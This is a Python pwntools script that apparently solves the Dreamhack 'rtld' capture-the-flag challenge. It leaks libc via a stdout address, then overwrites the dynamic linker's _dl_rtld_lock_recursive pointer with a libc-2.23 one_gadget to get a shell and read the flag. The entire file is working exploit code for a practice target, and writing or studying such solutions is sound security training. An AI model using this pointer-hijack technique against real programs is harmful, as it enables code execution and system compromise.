#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time

exe = ptr.ELF("./rtld_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc-2.23.so")
ld = ptr.ELF("./ld-2.23.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 10322)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main() -> bool:
    io = connect()

    io.recvuntil(b"stdout: ")
    libc.base = int(io.recvline().strip(b"\n"), 16) - unwrap(
        libc.symbol("_IO_2_1_stdout_")
    )
    ld.base = libc.base + 0x400000
    rtld_global = unwrap(ld.symbol("_rtld_global"))
    dl_load_lock = rtld_global + 2312
    dl_rtld_lock_recursive = rtld_global + 3848

    ptr.logger.info(f"&_rtld_global: {hex(rtld_global)}")
    ptr.logger.info(f"&_rtld_global._dl_load_lock: {hex(dl_load_lock)}")
    ptr.logger.info(
        f"&_rtld_global._dl_rtld_lock_recursive: {hex(dl_rtld_lock_recursive)}"
    )

    get_shell = unwrap(exe.symbol("get_shell"))
    one_gadgets = [0x4527A, 0xF03A4, 0xF1247]

    io.sendlineafter(b"addr: ", str(dl_rtld_lock_recursive))
    io.sendlineafter(b"value: ", str(libc.base + one_gadgets[2]))

    io.sendline(b"cat flag")
    io.recvuntil(b"DH{")
    flag = "DH{" + io.recvuntil(b"}").decode()

    ptr.logger.info(f"flag: {flag}")

    io.close()
    exit()


if __name__ == "__main__":
    main()
    # for i in range(0x3C0000, 0x500000, 0x1000):
    #     print(0x3CA000 == i)
    #     main(i)
    #     time.sleep(2)
